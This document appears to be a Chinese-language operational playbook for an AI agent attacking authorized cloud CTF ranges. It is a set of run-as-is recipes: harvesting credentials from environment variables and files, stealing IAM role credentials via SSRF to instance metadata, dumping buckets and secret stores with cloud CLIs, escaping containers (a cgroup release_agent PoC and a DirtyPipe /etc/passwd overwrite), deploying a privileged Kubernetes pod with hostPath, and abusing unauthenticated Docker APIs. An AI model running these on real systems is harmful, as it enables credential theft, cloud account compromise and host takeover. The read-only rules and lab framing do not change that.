# 云域 Playbook —— 立足点 → 云控制面 → flag

读者:sapper solver(flash 级)。场景:授权云靶场/云上立足点(容器、主机或经 SSRF 触达内网),向云控制面横向取证——有 flag 拿 flag,无 flag 产 finding。
本手册没有"视情况而定"——每条配方都是**判定条件写死 + 命令替换占位符后原样跑**。

全局约定:
- `FOOTHOLD` = 已立足的云上主机/容器(命令在这里跑,除非标注"攻击机")。**CLI 枚举一律在攻击机跑**(攻击机有外网能装工具;FOOTHOLD 不一定有)。只有 metadata 的 curl 在 FOOTHOLD 上跑(或经 SSRF 发出)。
- 凭证变量:`SID`/`SKEY` = SecretId/SecretKey 或 AccessKeyId/Secret;`TOKEN` = 临时会话 token(STS/SecurityToken)。拿到即记 loot 卡(§3.0),过期重取(§3.0)。
- 题型高度套路化——按本表"症状→手法"走,不要自由发挥。
- **拿到 flag → 3 秒内写 flags.json(§8)→ 继续打。这是第一优先级动作。**
- 纪律:云上**只读优先**。禁 Delete*/Create*/Put*/modify 类写操作(不建用户、不开新 AK、不删/改 secret、不加密 bucket);flag 通常可只读拿满。并发 ≤4;枚举输出全落 `tmp/` 留痕。

---

## 0. 总流程(序)

```
立足点身份清点(§1)→ 命中 metadata/AK/SK/token 哪条走哪条
→ SSRF 触达内网时:SSRF→IMDS 链(§2)
→ 拿到 AK/SK:验证→枚举→读敏感(§3,每家三段式)
→ 拿不到云凭证:容器逃逸判定表(§4)/ K8s 链(§5)/ Docker API(§6)
→ flag 自动收集(§8),flag 位置速查表兜底(§7)
```

停止条件:验收通过(全部 flag 到手),或任务截止前 10 分钟:停止扫描,确认 notes/loot 都已落盘。

---

## 1. 开局身份清点(立足点第一分钟,按序全跑,输出落 tmp/)

### 1.1 环境变量 AK/SK 模式匹配

```bash
# 1) 全环境变量过一遍(关键模式:access/secret/key/token/credential):
env | grep -aiE 'access|secret|key|token|credential|ak|sk|cloud' | tee tmp/env.txt
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -aiE 'access|secret|key|token|credential'
# 2) 文件系统全局 AK/SK 正则(先窄后宽,勿全盘 grep 浪费时间):
grep -raoE 'LTAI[A-Za-z0-9]{12,20}|AKID[A-Za-z0-9]{13,40}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}' \
  /root /home /opt /srv /var/www /etc /tmp /app 2>/dev/null | sort -u | head -50
# 3) .env / 配置类文件点名:
find /root /home /opt /srv /app /var/www -maxdepth 4 \( -name '.env*' -o -name '*credential*' -o -name '*secret*' -o -name 'config.json' \) -type f 2>/dev/null
```

**AK 前缀 → 云厂商速判表**(grep 命中后直接知道走 §3 哪一节):

| 前缀 | 厂商/含义 | CLI 走 |
|---|---|---|
| `LTAI` | 阿里云 AccessKeyId | aliyun CLI(§3.2) |
| `AKID` | 腾讯云 SecretId | tccli(§3.1) |
| `AKIA` | AWS 长期 AK | awscli(§3.3) |
| `ASIA` | AWS 临时 AK(STS/metadata 角色) | awscli + `AWS_SESSION_TOKEN`(§3.3) |
| `AIza` | GCP API key | 直接当 HTTP 参数用(§3.4) |
| `GOOG` | GCP 服务账号/访问密钥 | gcloud/curl(§3.4) |

### 1.2 云 metadata 探测判定表(一发打五家,命中哪家走哪家)

在 FOOTHOLD 上原样跑:

```bash
mkdir -p tmp
for u in http://100.100.100.200/latest/meta-data/ \
         http://metadata.tencentyun.com/latest/meta-data/ \
         http://169.254.169.254/latest/meta-data/ ; do
  echo "== $u"; curl -sS -m 3 "$u" 2>&1 | head -6; done
echo "== GCP"
curl -sS -m 3 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/ 2>&1 | head -6
echo "== Azure"
curl -sS -m 3 -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' 2>&1 | head -6
```

| 云 | metadata 地址 | 判定(响应特征) | 下一步 |
|---|---|---|---|
| 阿里云 | `http://100.100.100.200/latest/meta-data/` | 返回 instance-id/hostname 等列表 | §1.3 + §2 取 RAM 角色 |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/` | 同上 | §2 取 CAM 角色 |
| AWS | `http://169.254.169.254/latest/meta-data/` | 返回 ami-id/hostname 等 | §2.2 判 IMDSv1/v2 |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | **必须带 `Metadata-Flavor: Google` 头**,否则 403 | §2 取 service-account token |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | 必须带 `Metadata: true` 头 | 取 IMDS token(§2.1 表) |

判定铁律:返回 404/403/超时 = 不在;返回实例信息 = 命中,**立刻按 §2 抓角色凭证,再回头跑 1.3**。AWS 打 401/空 → 是 IMDSv2,走 §2.2。

### 1.3 云凭证文件路径清单(逐个 ls + cat,存在即读)

```bash
for f in ~/.aws/credentials ~/.aws/config ~/.tccli/default.credential ~/.tccli/default.csv \
         ~/.aliyun/config.json ~/.ossutilconfig ~/.cos.conf \
         ~/.config/gcloud/application_default_credentials.json \
         ~/.kube/config /etc/kubernetes/admin.conf /etc/kubernetes/kubelet.conf \
         ~/.docker/config.json ~/.ssh/id_* /root/.ssh/id_* ; do
  [ -f "$f" ] && echo "== FOUND: $f" && cat "$f"; done
```

| 文件 | 内容关键字段 |
|---|---|
| `~/.aws/credentials` | aws_access_key_id / aws_secret_access_key / aws_session_token |
| `~/.tccli/default.credential` | secretId / secretKey / token(腾讯 CLI 配置) |
| `~/.aliyun/config.json` | access_key_id / access_key_secret / sts_token |
| `~/.ossutilconfig` | accessKeyID / accessKeySecret / endpoint(阿里 ossutil) |
| `~/.cos.conf` | secretId / secretKey / bucket / region(腾讯 coscmd) |
| `~/.config/gcloud/application_default_credentials.json` | client_secret / refresh_token(GCP) |
| `~/.kube/config` | 集群 API + 客户端证书/token(→ §5) |
| `~/.docker/config.json` | auths → `echo <auth> \| base64 -d` 得 registry 账密 |

### 1.4 容器 / K8s / 云环境特征判定

```bash
ls /.dockerenv 2>/dev/null && echo "IN DOCKER"
cat /proc/1/cgroup | grep -aoE 'docker|kubepods|containerd' | head -1
env | grep -a KUBERNETES     # KUBERNETES_SERVICE_HOST/PORT = 在 K8s Pod 里
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null   # token/namespace/ca.crt
ls -la /var/run/docker.sock 2>/dev/null                         # docker.sock 挂载 → §6
cat /etc/hostname; hostname -i; ip -4 addr | grep inet
```

判定表:

| 症状 | 含义 | 下一步 |
|---|---|---|
| `KUBERNETES_SERVICE_HOST` 存在 | 在 Pod 里 | §5 K8s 链(先交 SA token 这张牌) |
| `/var/run/secrets/.../token` 存在 | 有 SA 凭证 | §5.1 |
| `/.dockerenv` 或 cgroup 含 docker | 在容器里 | §4 逃逸判定表 |
| `/var/run/docker.sock` 存在 | 可打宿主 | §6 |
| 什么都没有(裸虚机) | 在 CVM/ECS 上 | §1.2 metadata + §3 凭证横向 |

---

## 2. SSRF→IMDS 链(入口是 Web/SSRF 漏洞时)

Web 侧 SSRF 确认见 web playbook §6.3;本节假设可控 `http://` 请求(可读响应或盲打)。

### 2.1 各家角色凭证 URL 全文(先列角色名,再取凭证,两步)

| 云 | 第 1 步:列角色 | 第 2 步:取角色凭证(替换 `<ROLE>`) |
|---|---|---|
| AWS(IMDSv1) | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>` |
| 阿里云 | `http://100.100.100.200/latest/meta-data/ram/security-credentials/` | `http://100.100.100.200/latest/meta-data/ram/security-credentials/<ROLE>` |
| 腾讯云 | `http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/` | `http://metadata.tencentyun.com/latest/meta-data/cam/security-credentials/<ROLE>` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/`(带头) | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`(带头) |
| Azure | —(列角色无此步) | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/`(带头) |

返回字段对照(**拿到哪组就填 §3 哪家的 CLI**):

| 云 | 返回 JSON 字段 → CLI 变量 |
|---|---|
| AWS | `AccessKeyId` / `SecretAccessKey` / `Token` → AK / SK / `AWS_SESSION_TOKEN` |
| 阿里云 | `AccessKeyId` / `AccessKeySecret` / `SecurityToken` → AK / SK / sts_token |
| 腾讯云 | `TmpSecretId` / `TmpSecretKey` / `Token` → SID / SKEY / TENCENTCLOUD_TOKEN |
| GCP | `access_token` → 直接 `Authorization: Bearer`(§3.4 全用 curl) |
| Azure | `access_token` → ARM API Bearer(靶场少见,记录即可) |

SSRF 出口若只能盲打/只能 GET:IMDSv2 的 PUT 发不出去 → GCP/Azure(强制 header)打不通,记失败;AWS v1/阿里/腾讯 GET 即得,仍是主路。

### 2.2 IMDSv1 / v2 判定与 token 步骤(AWS 专属)

```bash
# 判定:直接 GET v1。
curl -sS -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/
#   → 200 返回角色名列表        = IMDSv1,直接接 §2.1 第 2 步
#   → 401 / {"Code":"Unauthorized"} / 空 = IMDSv2,走下面的 token 流程
# IMDSv2:先 PUT 换 token(TTL 拉满),之后每个请求带 header:
T=$(curl -sS -m 3 -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' http://169.254.169.254/latest/api/token)
curl -sS -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -sS -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

### 2.3 user-data / 自定义属性直读(flag 高频藏点,凭证之外必读)

```bash
# AWS / 阿里 / 腾讯(IMDSv2 环境记得带 token header):
curl -sS -m 3 http://169.254.169.254/latest/user-data
curl -sS -m 3 http://100.100.100.200/latest/user-data
curl -sS -m 3 http://metadata.tencentyun.com/latest/user-data
# GCP 一发递归全量(instance + project 属性 + ssh-keys,startup-script 里常见 flag/凭证):
curl -sS -H 'Metadata-Flavor: Google' 'http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text' | grep -aoEi 'flag[^ ]{0,80}|secret|key'
# 区域/实例 ID(§3 CLI 要用,顺手存):
curl -sS http://100.100.100.200/latest/meta-data/region-id            # 阿里:cn-hangzhou
curl -sS http://metadata.tencentyun.com/latest/meta-data/placement/region   # 腾讯:ap-guangzhou
curl -sS -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/placement/region  # AWS
```

任何 metadata 响应里出现 flag 正则(§8.1)→ 立即写 flags.json。

---

## 3. AK/SK 拿到后的横向(验证身份 → 枚举 → 读敏感数据,三段式)

### 3.0 凭证记账纪律(先做,30 秒)

1. 每组凭证记 loot 卡:`SID/SKEY/TOKEN` 全文、来源(文件/metadata/SSRF)、**取得时间与 Expiration**(临时凭证阿里/腾讯/AWS metadata 发的都是 1 小时上下,过期重 curl metadata 即可刷新,不要当作凭证已死)。
2. CLI 在攻击机跑。临时凭证三件套都设上,缺 session token 必报 `InvalidClientTokenId`/`AuthFailure.SignatureFailure`——那不是凭证坏,是没带 TOKEN。
3. 判定优先级:验证接口失败 ≠ 凭证死(可能只是无 CAM/sts 权限)——**直接跳到"枚举/读"试一发,以能读到的为准**。

### 3.1 腾讯云(tccli + coscmd)

```bash
pip install tccli coscmd 2>/dev/null | tail -1
export TENCENTCLOUD_SECRET_ID=$SID TENCENTCLOUD_SECRET_KEY=$SKEY TENCENTCLOUD_TOKEN=$TOKEN TENCENTCLOUD_REGION=<placement/region,如 ap-guangzhou>
```

**验证身份:**
```bash
tccli cam GetUserAppId          # 返回 OwnerUin/AppId = 活;报 AuthFailure = 换读接口试(见 §3.0)
tccli cvm DescribeInstances --Limit 1   # 能列实例也算活,顺手拿资产
```

**枚举(逐条跑,输出落 tmp/):**
```bash
tccli cvm DescribeInstances --Limit 100 > tmp/cvm.json          # 实例资产
tccli cos GetService > tmp/cos.json                             # 桶列表(桶全名 = <名字>-<AppId>)
tccli ssm ListSecrets > tmp/ssm.json                            # 凭据管理系统清单
tccli cam ListUsers > tmp/cam.json                              # 子用户(横向线索)
```

**读敏感数据(flag 高发位):**
```bash
# 1) COS 桶对象(coscmd 下载全量再 grep,最省事):
coscmd config -a $SID -s $SKEY -b <桶全名> -r <region> -t "$TOKEN"
coscmd list | tee tmp/cos-list.txt; grep -aiE 'flag|secret|backup|sql' tmp/cos-list.txt
coscmd download -r / ./cos-dump                                 # 小桶直接全拉;大桶按上面 grep 挑文件
# 2) SSM 凭据值:
tccli ssm GetSecretValue --secretName <SecretName> | jq -r .SecretString
# 3) 实例属性里找线索:
jq -r '.InstanceSet[]|"\(.InstanceId) \(.InstanceName) \(.PrivateIpAddresses[0])"' tmp/cvm.json
```

### 3.2 阿里云(aliyun CLI)

```bash
aliyun configure set --access-key-id $AK --access-key-secret $SK --sts-token "$TOKEN" --region <region-id,如 cn-hangzhou>
```

**验证身份:**
```bash
aliyun sts GetCallerIdentity        # 返回 UserId/Arn = 活;失败照 §3.0 直接试读
```

**枚举:**
```bash
aliyun oss ls > tmp/oss.txt                         # 桶列表(oss 子命令内建,无需 ossutil)
aliyun ecs DescribeRegions > tmp/regions.json       # 没有区域线索时先拿全区域
aliyun ecs DescribeInstances --RegionId <region> > tmp/ecs.json
aliyun ram ListUsers > tmp/ram.json
```

**读敏感数据:**
```bash
aliyun oss ls oss://<bucket> | tee tmp/oss-objs.txt                 # 列对象
aliyun oss cp oss://<bucket>/<key> ./file -f                        # 下载单对象
aliyun oss cp oss://<bucket>/ ./dump -r -f                          # 小桶全量拉(-r 递归)
# KMS / 凭据:
aliyun kms ListKeys; aliyun kms GetSecretValue --SecretName <n> 2>/dev/null
```

### 3.3 AWS(awscli)

```bash
pip install awscli 2>/dev/null | tail -1
export AWS_ACCESS_KEY_ID=$AK AWS_SECRET_ACCESS_KEY=$SK AWS_SESSION_TOKEN=$TOKEN AWS_DEFAULT_REGION=<region>
```

**验证身份:**
```bash
aws sts get-caller-identity     # 返回 Account/Arn = 活
```

**枚举:**
```bash
aws s3 ls > tmp/s3.txt                          # 桶列表
aws ec2 describe-instances --output json > tmp/ec2.json
aws lambda list-functions --output json > tmp/lambda.json
aws iam list-users --output json > tmp/iam.json
```

**读敏感数据(flag 高发位,按序):**
```bash
aws s3 ls s3://<bucket> --recursive | tee tmp/s3-objs.txt; grep -aiE 'flag|secret|backup|tfstate' tmp/s3-objs.txt
aws s3 cp s3://<bucket>/<key> ./ ; aws s3 sync s3://<bucket> ./s3-dump   # 挑选/全量
aws secretsmanager list-secrets | jq -r '.SecretList[].Name'
aws secretsmanager get-secret-value --secret-id <Name> | jq -r .SecretString
aws lambda get-function-configuration --function-name <fn> | jq -r '.Environment.Variables'   # lambda 环境变量
aws ssm describe-parameters | jq -r '.Parameters[].Name'
aws ssm get-parameter --name <Name> --with-decryption | jq -r '.Parameter.Value'
aws ec2 describe-instance-attribute --instance-id <i-xxx> --attribute userData | jq -r '.UserData.Value' | base64 -d
aws ec2 describe-tags --output text | grep -i flag               # tag 里藏 flag 见过
```

### 3.4 GCP(metadata token + 纯 curl,无 gcloud 也能打)

```bash
PROJ=$(curl -sS -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id)
T=$(curl -sS -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token | jq -r .access_token)
A="Authorization: Bearer $T"
```

**枚举 + 读敏感:**
```bash
curl -sS -H "$A" "https://storage.googleapis.com/storage/v1/b?project=$PROJ" | jq -r '.items[].name'
curl -sS -H "$A" "https://storage.googleapis.com/storage/v1/b/<bkt>/o?fields=items(name)" | jq -r '.items[].name'
curl -sS -H "$A" -o out.bin "https://storage.googleapis.com/storage/v1/b/<bkt>/o/<obj>?alt=media"   # 下载对象
curl -sS -H "$A" "https://secretmanager.googleapis.com/v1/projects/$PROJ/secrets?pageSize=100"
curl -sS -H "$A" "https://secretmanager.googleapis.com/v1/projects/$PROJ/secrets/<name>/versions/latest:access" | jq -r .payload.data | base64 -d
curl -sS -H "$A" "https://compute.googleapis.com/compute/v1/projects/$PROJ/zones/-/instances" | jq -r '.items[].name' 2>/dev/null
```

metadata 里 service-account 的 email/scopes 一并看(决定上面 API 哪些能通):
```bash
curl -sS -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
```

---

## 4. 容器逃逸判定表(拿不到云凭证时先看脚下,症状逐行试)

```bash
# 逃逸前置体检(一次跑完):
id; grep CapEff /proc/self/status; capsh --print 2>/dev/null | grep -i 'cap_sys_admin'
ls -la /var/run/docker.sock; ls /host* /mnt /var/run/secrets 2>/dev/null
ps -p 1 -o comm=; cat /proc/mounts | grep -avE 'proc|sys|cgroup|devpts|tmpfs|mqueue|shm' | tee tmp/mounts.txt
uname -r; ls /dev/vd* /dev/sd* /dev/nvme* 2>/dev/null
```

| 症状(判定) | 动作(写死) |
|---|---|
| `/var/run/docker.sock` 可连 | §6(等于宿主 root,逃逸收官) |
| CapEff 含 `cap_sys_admin`(capsh 输出非空) | 特权容器:①`ls /dev/vd* /dev/sd* /dev/nvme*` 取盘;②`mkdir /tmp/h && mount /dev/<盘>1 /tmp/h`(`/dev/vda1`→`/dev/sda1`→`/dev/nvme0n1p1` 逐个试);③`find /tmp/h -maxdepth 3 -name '*flag*'` + `cat /tmp/h/root/flag*` |
| 上一条 mount 失败但确有 cap_sys_admin | cgroup v1 release_agent 逃逸:见下方 PoC 原样跑 |
| `ps -p 1` 显示的不是本进程(systemd/init 等) | hostPID 共享:`nsenter -t 1 -m -u -i -n -p /bin/sh` → 进宿主命名空间 → `find / -maxdepth 3 -name '*flag*'` |
| mounts.txt 有宿主 bind(如 `/host`、`/hostfs`、`/data`,或 `/etc` 指向宿主路径) | 直接在该路径找 flag:`find <路径> -maxdepth 3 -name '*flag*' 2>/dev/null` |
| `uname -r` 命中 5.8–5.10.101 / 5.15–5.15.24 / 5.16–5.16.10 | DirtyPipe(CVE-2022-0847,可写 ro 挂载文件):工具箱编译 dirtypipez(用法 `./dirtypipez <file> <offset> <data>`);**data 必须与被覆盖字节等长**:`OFF=$(grep -bo '^root' /etc/passwd \| head -1 \| cut -d: -f1)` → `./dirtypipez /etc/passwd $OFF 'root:::'`(把行首 `root:x:` 7 字节等长置 `root:::` 免密)→ `su root` 进 root → `find / -maxdepth 3 -name '*flag*'`(/etc/passwd 若是宿主 ro 挂载,此改写对宿主同样生效) |
| `/proc/sys/kernel/core_pattern` 可写(且挂了宿主 /proc) | 写 core_pattern 反弹:记入失败清单备选,优先走上面各行 |
| `/var/run/secrets/kubernetes.io/serviceaccount/token` 存在 | 别逃了,先打 K8s 面:§5(SA token 常比逃逸更快出 flag) |
| 全不中 | 翻 `/root/.bash_history`、`/proc/1/environ`、CI 配置(`.gitlab-ci.yml`/`Jenkinsfile`/`/var/run/secrets`),找下一段凭证再横向 |

release_agent PoC(cgroup v1 + cap_sys_admin,原样跑):

```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
printf '#!/bin/sh\nfind / -maxdepth 3 -name "*flag*" > %s/out 2>&1\n' "$host_path" > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 1; cat /out
```

**逃逸成功后 flag 标准位**:`/root/flag*` `/flag*` `/home/*/flag*` `find / -maxdepth 3 -name '*flag*' 2>/dev/null`。逃逸后宿主上重跑 §1(宿主机常有真 AK/SK、`~/.kube/config`)。

---

## 5. K8s 链

### 5.1 ServiceAccount token:路径 → 解码 → 权限

```bash
SA=/var/run/secrets/kubernetes.io/serviceaccount
TOKEN=$(cat $SA/token); NS=$(cat $SA/namespace)
# JWT payload 解码(看 namespace/pod/serviceaccount 名):
python3 -c "import base64,sys;print(base64.urlsafe_b64decode(sys.argv[1]+'===').decode(errors='ignore'))" "$(echo $TOKEN | cut -d. -f2)"
# kubectl 可用性:Pod 内常自带 in-cluster 配置,直接跑:
kubectl get pods -A 2>&1 | head -20
kubectl auth can-i --list        # 当前 SA 能干什么,决定走 5.3 还是 5.4
```

### 5.2 kubectl 枚举三连(可用时,完整命令)

```bash
kubectl get pods -A -o wide | tee tmp/pods.txt
kubectl get secrets -A | tee tmp/secrets.txt
kubectl get configmaps -A | tee tmp/cms.txt
kubectl get sa,deploy,nodes -A | head -40
```

**secret 里翻 flag(键名常就叫 flag):**
```bash
kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"/"}{.metadata.name}{"\t"}{.data}{"\n"}{end}' > tmp/secrets-full.tsv
grep -ai flag tmp/secrets-full.tsv                       # base64 前键名/值线索
kubectl get secret <ns>/<name> -o jsonpath='{.data.flag}' | base64 -d     # 命中条目解码
kubectl get configmaps -A -o json | grep -aoE 'flag\{[^}]{1,200}\}'        # configmap 原文可能明文带 flag
```

### 5.3 无 kubectl:纯 curl 打 API server(等价三连)

```bash
APIS="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT:-443}"
H="Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)"
curl -sk -H "$H" $APIS/api/v1/pods > tmp/api-pods.json
curl -sk -H "$H" $APIS/api/v1/secrets > tmp/api-secrets.json
curl -sk -H "$H" $APIS/api/v1/configmaps > tmp/api-cms.json
# 解码 secret 值(jq 一发全解):
jq -r '.items[]|.metadata.name as $n|.data|to_entries[]|"\($n) \(.key) \(.value|@base64d)"' tmp/api-secrets.json 2>/dev/null | grep -ai flag
```

**权限自查(curl 版 can-i):**
```bash
curl -sk -X POST -H "$H" -H 'Content-Type: application/json' $APIS/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' | jq -c '.status.resourceRules[]|select(.verbs[0]=="*" or (.verbs|index("create")))'
```

### 5.4 API server 未授权 / 高权 SA → 建 pod 逃逸

判定:匿名 `curl -sk https://<api>:6443/api/v1/secrets` 返回 `{"kind":"SecretList"`(而非 `Unauthorized`/`Forbidden`)= 匿名可用,去掉 Authorization 直接打;或 `kubectl auth can-i create pods -A` = yes:

```bash
cat <<'EOF' > tmp/pod.yaml
apiVersion: v1
kind: Pod
metadata: {name: pwn}
spec:
  hostPID: true
  containers:
  - name: pwn
    image: alpine
    command: ["sh","-c","sleep 100000"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes:
  - name: h
    hostPath: {path: /}
EOF
kubectl apply -f tmp/pod.yaml && sleep 8
kubectl exec pwn -- sh -c 'find /host -maxdepth 3 -name "*flag*" | head; cat /host/root/flag* /host/flag* 2>/dev/null'
```
镜像拉不下来(无外网)→ `kubectl get pods -A -o jsonpath='{.items[0].spec.containers[0].image}'` 取集群里已在用的镜像名替换 `alpine`。

**逃逸到宿主(节点)后**:宿主 `/root/.kube/config` 常是 cluster-admin → 换 `--kubeconfig /tmp/kc` 重打全集群;`/etc/kubernetes/admin.conf` 同物。

---

## 6. Docker API(2375/2376 未授权 + docker.sock)

判定:
```bash
# 远程(从攻击机或 SSRF):
curl -sS -m 3 http://<IP>:2375/version | head -3       # 返回 Version/Os = 未授权命中
curl -sS -m 3 -k https://<IP>:2376/version | head -3   # 2376=TLS 口,靶场少见
# 本地(sock 挂载):
curl -sS --unix-socket /var/run/docker.sock http://localhost/version | head -3
```
命中(任一)→ 挂宿主根拿 flag:

```bash
# 有 docker 客户端时(首选;IMG 取 images 里已存在的,免拉镜像):
docker -H tcp://<IP>:2375 ps -a
docker -H tcp://<IP>:2375 images
docker -H tcp://<IP>:2375 run --rm -v /:/mnt <IMG> sh -c 'find /mnt -maxdepth 3 -name "*flag*" | head -20; cat /mnt/flag* /mnt/root/flag* 2>/dev/null'
# sock 场景把 -H 换成:
docker -H unix:///var/run/docker.sock run --rm -v /:/mnt <IMG> sh -c 'find /mnt -maxdepth 3 -name "*flag*" | head'
```

无 docker 客户端 → 纯 curl 兜底(FOOTHOLD 上跑):

```bash
D=http://<IP>:2375   # sock 场景:curl --unix-socket /var/run/docker.sock http://localhost/<同路径>
IMG=$(curl -sS $D/images/json | jq -r '.[0].RepoTags[0]')            # 取本地已有镜像
curl -sS -X POST -H 'Content-Type: application/json' "$D/containers/create?name=pwn" \
  -d "{\"Image\":\"$IMG\",\"Cmd\":[\"sh\",\"-c\",\"find /mnt -maxdepth 3 -name '*flag*' -exec cat {} + 2>/dev/null\"],\"Binds\":[\"/:/mnt:ro\"]}"
curl -sS -X POST $D/containers/pwn/start; sleep 3
curl -sS "$D/containers/pwn/logs?stdout=1" | strings | grep -a flag   # 输出带 8 字节帧头,strings 过一遍
curl -sS -X POST "$D/containers/pwn/wait" >/dev/null; curl -sS -X DELETE $D/containers/pwn >/dev/null
```

Docker API 上还能:列出并 `docker logs` 其他容器(别人容器 env/日志常有 flag)、`docker inspect <c>` 看 `Config.Env`(flag 高发位)。**禁**:`docker rm`/`rmi`/`system prune` 类破坏。

---

## 7. flag 位置速查表(云靶场常见藏点,横向卡住时逐个兜)

| # | 藏点 | 命令(替换占位后原样跑) |
|---|---|---|
| 1 | 文件系统(立足点/逃逸后宿主) | `find / -maxdepth 3 -name '*flag*' 2>/dev/null; cat /flag* /root/flag* 2>/dev/null` |
| 2 | 环境变量(容器/lambda/进程) | `env \| grep -ai flag`;`cat /proc/*/environ \| tr '\0' '\n' \| grep -ai flag`;AWS:`aws lambda get-function-configuration --function-name <fn> \| jq -r '.Environment.Variables'` |
| 3 | user-data / startup-script | §2.3 三家 curl;AWS CLI 版:`aws ec2 describe-instance-attribute --instance-id <i> --attribute userData \| jq -r '.UserData.Value' \| base64 -d` |
| 4 | bucket 对象 | 腾讯:`coscmd list \| grep -ai flag` 后 `coscmd download`;阿里:`aliyun oss ls oss://<bkt>` 后 `aliyun oss cp`;AWS:`aws s3 ls s3://<bkt> --recursive \| grep -ai flag` 后 `aws s3 cp`;GCP:§3.4 |
| 5 | Secrets Manager / SSM / KMS | 腾讯 §3.1-2;阿里 §3.2;AWS:`aws secretsmanager get-secret-value --secret-id <n>` / `aws ssm get-parameter --with-decryption`;GCP §3.4 |
| 6 | K8s Secret / ConfigMap | §5.2/5.3(secret 键名常为 `flag`,jsonpath 出来 base64 -d) |
| 7 | 实例自定义属性 / tag | GCP:`.../computeMetadata/v1/project/attributes/?recursive=true`(带头);AWS:`aws ec2 describe-tags --output text \| grep -i flag` |
| 8 | 其他容器的 env / 日志 | `docker ps -a -q` 逐个 `docker inspect <c> \| jq -r '.Config.Env'`、`docker logs <c> 2>&1 \| grep -a flag` |
| 9 | 镜像层 / CI 配置 | `history \| grep -ai flag`;`.gitlab-ci.yml`/`Jenkinsfile`/`Dockerfile` 里 grep;镜像内 `/.git/config` |
| 10 | TF state / 备份文件 | `find / -maxdepth 4 -name '*.tfstate*' -o -name '*.bak' -o -name '*.sql' 2>/dev/null` 后 grep flag |

---

## 8. flag 收集纪律

### 8.1 flag 正则(唯三,所有输出扫这三个)
```
flag\{[^}]{1,512}\}
ctf\{[^}]{1,512}\}
hack\{[^}]{1,512}\}
```
- 只记录匹配串原文,不做大小写/空白归一化;题目描述给了自定义格式以描述为准。

### 8.2 flags.json 收件箱(唯一记录通道)
- 位置:工作目录 `flags.json`,JSON Lines,每行一个候选:
  ```json
  {"flag":"flag{...}","via":"metadata user-data / cos bucket xxx","correct":null}
  ```
- 规则:①只追加,不重写;②**引擎自动刮取入库**,你不需要手工搬运;③疑似 flag 也会兜底入库。
- 任何命令输出、文件内容、JSON 响应里命中 §8.1 正则 → 已被自动收集,继续当前动作。

### 8.3 卡壳出口
同一题 20 分钟无进展:①回 §1 重跑身份清点(换凭证/新挂载会出现);②按 §7 速查表从上到下兜一遍;③切 §4/§5/§6 下一张判定表;④仍无果记失败清单(题目、已试、现象)等深挖会话。**不要**对同一 metadata/API 重复喷超过 10 发——那是权限没有,不是再试一次就有。

### 8.4 收尾自检
- 验收通过(全部 flag 到手)→ 停止一切动作。
- loot 卡齐全(每组凭证:值、来源、Expiration、已试接口),下一轮轮换实例后按卡重放,不重新摸索。
